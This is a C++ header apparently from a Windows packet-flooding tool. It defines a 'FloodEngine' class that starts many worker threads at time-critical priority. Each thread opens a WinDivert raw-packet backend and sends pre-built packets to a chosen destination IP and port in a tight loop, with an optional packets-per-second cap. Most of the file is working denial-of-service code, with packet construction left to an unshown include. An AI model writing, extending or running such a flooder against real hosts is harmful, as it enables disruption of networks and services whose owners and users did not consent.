#pragma once
#include <windows.h>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <mutex>
#include "network_backend.h"  
#include "packet_builder.h"

class FloodEngine {
public:
    FloodEngine(int threads, uint32_t dst_ip, uint16_t dst_port, int mode, 
                uint64_t target_pps, uint32_t duration)
        : m_threads(threads), m_dst_ip(dst_ip), m_dst_port(dst_port), m_mode(mode), 
          m_running(false), m_total_sent(0), m_target_pps(target_pps), m_duration(duration) {}

    void start() {
        m_running = true;
        for (int i = 0; i < m_threads; ++i) {
            m_workers.emplace_back(&FloodEngine::workerLoop, this, i);
        }
    }

    void stop() {
        m_running = false;
        for (auto& t : m_workers) if (t.joinable()) t.join();
        m_workers.clear();
    }

    uint64_t getTotalSent() const { return m_total_sent.load(std::memory_order_relaxed); }

private:
    void workerLoop(int thread_id) {
        DWORD_PTR mask = 1ULL << (thread_id % std::thread::hardware_concurrency());
        SetThreadAffinityMask(GetCurrentThread(), mask);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

        NetworkBackend backend;
        {
            std::lock_guard<std::mutex> lock(m_divert_mutex);
            if (!backend.open()) {
                printf("[Thread %d] WinDivert Open Failed! Are you Admin? Error: %lu\n", thread_id, GetLastError());
                return;
            }
        }

        // 直接传 IP 和端口即可
        auto packet_pool = PacketBuilder::PreGeneratePools(m_dst_ip, m_dst_port, m_mode);
        int pool_size = packet_pool.size();
        int idx = 0;

        uint64_t rate_per_thread = (m_target_pps > 0) ? (m_target_pps / m_threads) : 0;
        auto thread_start_time = std::chrono::high_resolution_clock::now();
        uint64_t local_sent = 0;

        while (m_running) {
            if (rate_per_thread > 0) {
                auto now = std::chrono::high_resolution_clock::now();
                double elapsed_sec = std::chrono::duration<double>(now - thread_start_time).count();
                double allowed_sent = elapsed_sec * rate_per_thread;
                
                if (local_sent >= allowed_sent) {
                    std::this_thread::sleep_for(std::chrono::microseconds(200));
                    continue;
                }
            }

            const auto& pkt = packet_pool[idx];
            backend.send(pkt.data(), (uint32_t)pkt.size());
            
            idx = (idx + 1) % pool_size;
            local_sent++;
            m_total_sent.fetch_add(1, std::memory_order_relaxed);
        }
        backend.close();
    }

    int m_threads;
    uint32_t m_dst_ip;
    uint16_t m_dst_port;
    int m_mode;
    uint64_t m_target_pps;
    uint32_t m_duration;
    
    std::atomic<bool> m_running;
    std::atomic<uint64_t> m_total_sent;
    std::vector<std::thread> m_workers;
    
    static std::mutex m_divert_mutex;
};

std::mutex FloodEngine::m_divert_mutex;
